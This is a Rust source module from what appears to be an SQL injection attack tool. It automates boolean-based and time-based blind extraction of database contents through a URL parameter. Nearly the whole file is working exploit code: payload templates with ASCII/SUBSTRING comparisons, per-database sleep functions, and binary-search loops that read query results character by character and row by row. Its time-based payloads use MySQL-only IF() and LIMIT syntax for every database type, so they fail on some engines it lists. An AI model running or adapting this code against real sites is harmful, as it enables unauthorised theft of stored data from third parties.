//! Blind SQL Injection Data Extraction
//!
//! Extracts data character by character using boolean or time-based inference

use crate::http::client::HttpClient;
use crate::http::request::HttpRequest;
use crate::sqli::DatabaseType;
use reqwest::Method;
use std::time::Instant;
use url::Url;

/// Character set for binary search
const CHARSET: &str = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@._-!#$%^&*()+=[]{}|;:',<>?/~`";

/// Extract a single value using boolean-based blind SQLi
pub async fn boolean_extract_value(
    client: &HttpClient,
    url: &Url,
    param: &str,
    query: &str,
    db_type: DatabaseType,
) -> anyhow::Result<String> {
    let mut result = String::new();
    
    // First get the length
    let length = boolean_extract_length(client, url, param, query, db_type).await?;
    
    if length == 0 {
        return Ok(result);
    }
    
    tracing::info!("[BLIND] Extracting {} characters...", length);
    
    // Extract character by character
    for pos in 1..=length {
        let c = boolean_extract_char(client, url, param, query, pos, db_type).await?;
        result.push(c);
        
        if pos % 10 == 0 {
            tracing::debug!("[BLIND] Progress: {}/{}", pos, length);
        }
    }
    
    Ok(result)
}

/// Extract length of query result
async fn boolean_extract_length(
    client: &HttpClient,
    url: &Url,
    param: &str,
    query: &str,
    db_type: DatabaseType,
) -> anyhow::Result<usize> {
    let len_func = match db_type {
        DatabaseType::MySQL | DatabaseType::Unknown => "LENGTH",
        DatabaseType::PostgreSQL => "LENGTH",
        DatabaseType::MSSQL => "LEN",
        DatabaseType::Oracle => "LENGTH",
        DatabaseType::SQLite => "LENGTH",
    };
    
    // Binary search for length (1-1000)
    let mut low = 1;
    let mut high = 1000;
    
    while low < high {
        let mid = (low + high + 1) / 2;
        
        let payload = format!(
            "' AND {}(({}))<{}-- ",
            len_func, query, mid
        );
        
        let mut test_url = url.clone();
        test_url.query_pairs_mut().append_pair(param, &payload);
        
        let req = HttpRequest::new(Method::GET, test_url);
        let resp = client.execute(req).await?;
        
        // Determine if condition was true based on response
        if is_true_response(&resp.body_text()) {
            high = mid - 1;
        } else {
            low = mid;
        }
    }
    
    Ok(low)
}

/// Extract a single character at position
async fn boolean_extract_char(
    client: &HttpClient,
    url: &Url,
    param: &str,
    query: &str,
    position: usize,
    db_type: DatabaseType,
) -> anyhow::Result<char> {
    let substr_func = match db_type {
        DatabaseType::MySQL | DatabaseType::Unknown => "SUBSTRING",
        DatabaseType::PostgreSQL => "SUBSTRING",
        DatabaseType::MSSQL => "SUBSTRING",
        DatabaseType::Oracle => "SUBSTR",
        DatabaseType::SQLite => "SUBSTR",
    };
    
    // Binary search through ASCII values (32-126)
    let mut low = 32u8;
    let mut high = 126u8;
    
    while low < high {
        let mid = (low + high + 1) / 2;
        
        let payload = format!(
            "' AND ASCII({}(({}),'{}',1))<{}-- ",
            substr_func, query, position, mid
        );
        
        let mut test_url = url.clone();
        test_url.query_pairs_mut().append_pair(param, &payload);
        
        let req = HttpRequest::new(Method::GET, test_url);
        let resp = client.execute(req).await?;
        
        if is_true_response(&resp.body_text()) {
            high = mid - 1;
        } else {
            low = mid;
        }
    }
    
    Ok(low as char)
}

/// Extract a single value using time-based blind SQLi
pub async fn time_extract_value(
    client: &HttpClient,
    url: &Url,
    param: &str,
    query: &str,
    db_type: DatabaseType,
    delay_seconds: u64,
) -> anyhow::Result<String> {
    let mut result = String::new();
    
    // First get the length
    let length = time_extract_length(client, url, param, query, db_type, delay_seconds).await?;
    
    if length == 0 {
        return Ok(result);
    }
    
    tracing::info!("[TIME-BLIND] Extracting {} characters (this may take a while)...", length);
    
    // Extract character by character
    for pos in 1..=length {
        let c = time_extract_char(client, url, param, query, pos, db_type, delay_seconds).await?;
        result.push(c);
        
        tracing::debug!("[TIME-BLIND] Progress: {}/{} - Current: {}", pos, length, result);
    }
    
    Ok(result)
}

/// Extract length using time-based technique
async fn time_extract_length(
    client: &HttpClient,
    url: &Url,
    param: &str,
    query: &str,
    db_type: DatabaseType,
    delay: u64,
) -> anyhow::Result<usize> {
    let sleep_func = get_sleep_function(db_type, delay);
    let len_func = match db_type {
        DatabaseType::MySQL | DatabaseType::Unknown => "LENGTH",
        DatabaseType::PostgreSQL => "LENGTH",
        DatabaseType::MSSQL => "LEN",
        DatabaseType::Oracle => "LENGTH",
        DatabaseType::SQLite => "LENGTH",
    };
    
    let threshold_ms = (delay * 1000) - 500; // Allow 500ms margin
    
    // Binary search for length
    let mut low = 1;
    let mut high = 500;
    
    while low < high {
        let mid = (low + high + 1) / 2;
        
        let payload = format!(
            "' AND IF({}(({}))<{},{},0)-- ",
            len_func, query, mid, sleep_func
        );
        
        let mut test_url = url.clone();
        test_url.query_pairs_mut().append_pair(param, &payload);
        
        let req = HttpRequest::new(Method::GET, test_url);
        let start = Instant::now();
        let _resp = client.execute(req).await?;
        let elapsed = start.elapsed().as_millis();
        
        if elapsed >= threshold_ms as u128 {
            high = mid - 1;
        } else {
            low = mid;
        }
    }
    
    Ok(low)
}

/// Extract a single character using time-based technique
async fn time_extract_char(
    client: &HttpClient,
    url: &Url,
    param: &str,
    query: &str,
    position: usize,
    db_type: DatabaseType,
    delay: u64,
) -> anyhow::Result<char> {
    let sleep_func = get_sleep_function(db_type, delay);
    let substr_func = match db_type {
        DatabaseType::MySQL | DatabaseType::Unknown => "SUBSTRING",
        DatabaseType::PostgreSQL => "SUBSTRING",
        DatabaseType::MSSQL => "SUBSTRING",
        DatabaseType::Oracle => "SUBSTR",
        DatabaseType::SQLite => "SUBSTR",
    };
    
    let threshold_ms = (delay * 1000) - 500;
    
    // Binary search through ASCII values
    let mut low = 32u8;
    let mut high = 126u8;
    
    while low < high {
        let mid = (low + high + 1) / 2;
        
        let payload = format!(
            "' AND IF(ASCII({}(({}),'{}',1))<{},{},0)-- ",
            substr_func, query, position, mid, sleep_func
        );
        
        let mut test_url = url.clone();
        test_url.query_pairs_mut().append_pair(param, &payload);
        
        let req = HttpRequest::new(Method::GET, test_url);
        let start = Instant::now();
        let _resp = client.execute(req).await?;
        let elapsed = start.elapsed().as_millis();
        
        if elapsed >= threshold_ms as u128 {
            high = mid - 1;
        } else {
            low = mid;
        }
    }
    
    Ok(low as char)
}

/// Get database-specific sleep function
fn get_sleep_function(db_type: DatabaseType, seconds: u64) -> String {
    match db_type {
        DatabaseType::MySQL | DatabaseType::Unknown => format!("SLEEP({})", seconds),
        DatabaseType::PostgreSQL => format!("PG_SLEEP({})", seconds),
        DatabaseType::MSSQL => format!("WAITFOR DELAY '0:0:{}'", seconds),
        DatabaseType::Oracle => format!("DBMS_LOCK.SLEEP({})", seconds),
        DatabaseType::SQLite => format!("RANDOMBLOB({})", seconds * 100000000),
    }
}

/// Determine if response indicates TRUE condition
fn is_true_response(body: &str) -> bool {
    // This is a simple heuristic - in practice, you'd compare to baseline
    // A true response typically has content, false is often empty or error
    !body.is_empty() && 
    !body.to_lowercase().contains("error") &&
    !body.to_lowercase().contains("warning") &&
    !body.to_lowercase().contains("no results")
}

/// Extract a list of values using boolean blind
pub async fn boolean_extract_list(
    client: &HttpClient,
    url: &Url,
    param: &str,
    query: &str,
    db_type: DatabaseType,
    max_items: usize,
) -> anyhow::Result<Vec<String>> {
    let mut results = Vec::new();
    
    for i in 0..max_items {
        // Modify query to get row i
        let row_query = format!("{} LIMIT {},1", query, i);
        
        let value = boolean_extract_value(client, url, param, &row_query, db_type).await?;
        
        if value.is_empty() {
            break;
        }
        
        results.push(value);
    }
    
    Ok(results)
}

